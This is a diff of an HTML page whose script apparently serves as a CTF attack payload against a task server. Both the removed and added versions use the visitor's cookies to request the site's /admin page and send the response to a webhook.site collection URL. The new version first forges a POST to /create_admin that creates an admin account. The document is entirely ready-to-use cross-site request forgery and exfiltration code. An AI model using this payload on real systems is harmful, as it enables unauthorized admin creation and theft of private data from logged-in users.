@@ -2,67 +2,117 @@
 <html>
 <body>
 <script>
-fetch('http://tasks.goidactf.ru:20061/admin', {
-    method: 'GET',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json'
-    }
-})
-.then(response => {
-    // Получаем полный ответ от /admin
-    const status = response.status;
-    const headers = Object.fromEntries(response.headers.entries());
-    
-    return response.text().then(body => ({
-        status,
-        headers,
-        body
-    }));
-})
-.then(adminData => {
-    // Формируем данные для отправки на webhook
-    const payload = {
-        timestamp: new Date().toISOString(),
-        source: 'admin-request',
-        data: adminData
-    };
-    
-    // Отправляем данные на webhook.site
-    return fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-    });
-})
-.then(webhookResponse => {
-    if (webhookResponse.ok) {
-        console.log('✅ Данные успешно отправлены на webhook');
-        return webhookResponse.text();
-    } else {
-        throw new Error(`Webhook error: ${webhookResponse.status}`);
-    }
-})
-.then(webhookResult => {
-    console.log('Webhook response:', webhookResult);
-})
-.catch(error => {
-    console.error('❌ Ошибка:', error);
-    
-    // Пытаемся отправить информацию об ошибке на webhook
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
+(async () => {
+    try {
+        // 1. Сначала выполняем POST запрос для создания админа
+        const createAdminResponse = await fetch("https://tasks.goidactf.ru:20061/create_admin", {
+            method: "POST",
+            headers: {
+                "accept": "*/*",
+                "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+                "content-type": "application/x-www-form-urlencoded",
+                "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Microsoft Edge\";v=\"144\"",
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": "\"Windows\"",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin"
+            },
+            body: "new_admin_login=123",
+            credentials: "include", // Включаем куки
+            mode: "cors",
+            referrer: "https://tasks.goidactf.ru:20061/admin"
+        });
+
+        // Собираем данные ответа от create_admin
+        const createAdminData = {
+            status: createAdminResponse.status,
+            statusText: createAdminResponse.statusText,
+            headers: Object.fromEntries(createAdminResponse.headers.entries()),
+            body: await createAdminResponse.text(),
             timestamp: new Date().toISOString(),
-            error: error.toString()
-        })
-    }).catch(() => {});
-});
+            endpoint: "create_admin"
+        };
+
+        console.log('✅ Запрос create_admin выполнен:', createAdminData.status);
+
+        // 2. Затем выполняем GET запрос к админке
+        const adminResponse = await fetch('http://tasks.goidactf.ru:20061/admin', {
+            method: 'GET',
+            credentials: 'include', // Включаем куки
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+
+        // Собираем данные ответа от админки
+        const adminData = {
+            status: adminResponse.status,
+            statusText: adminResponse.statusText,
+            headers: Object.fromEntries(adminResponse.headers.entries()),
+            body: await adminResponse.text(),
+            timestamp: new Date().toISOString(),
+            endpoint: "admin"
+        };
+
+        console.log('✅ Запрос admin выполнен:', adminData.status);
+
+        // 3. Формируем полный payload для отправки на webhook
+        const payload = {
+            timestamp: new Date().toISOString(),
+            source: 'dual-request-sequence',
+            sequence: [createAdminData, adminData],
+            userAgent: navigator.userAgent
+        };
+
+        // 4. Отправляем все данные на webhook
+        const webhookResponse = await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Sequence-Complete': 'true'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (webhookResponse.ok) {
+            const webhookResult = await webhookResponse.text();
+            console.log('✅ Все данные успешно отправлены на webhook');
+            console.log('Webhook response:', webhookResult);
+            
+            // Дополнительно выводим ключевую информацию в консоль
+            console.log('\n📊 Сводка результатов:');
+            console.log('1. create_admin:', createAdminData.status, createAdminData.statusText);
+            console.log('2. admin:', adminData.status, adminData.statusText);
+            console.log('3. Тело ответа admin (первые 500 символов):', 
+                       adminData.body.substring(0, 500) + (adminData.body.length > 500 ? '...' : ''));
+        } else {
+            throw new Error(`Webhook error: ${webhookResponse.status}`);
+        }
+
+    } catch (error) {
+        console.error('❌ Ошибка выполнения:', error);
+        
+        // Пытаемся отправить информацию об ошибке на webhook
+        try {
+            await fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    error: error.toString(),
+                    stage: error.stage || 'unknown',
+                    userAgent: navigator.userAgent
+                })
+            });
+            console.log('✅ Информация об ошибке отправлена на webhook');
+        } catch (webhookError) {
+            console.error('❌ Не удалось отправить ошибку на webhook:', webhookError);
+        }
+    }
+})();
 </script>
 </body>
 </html>
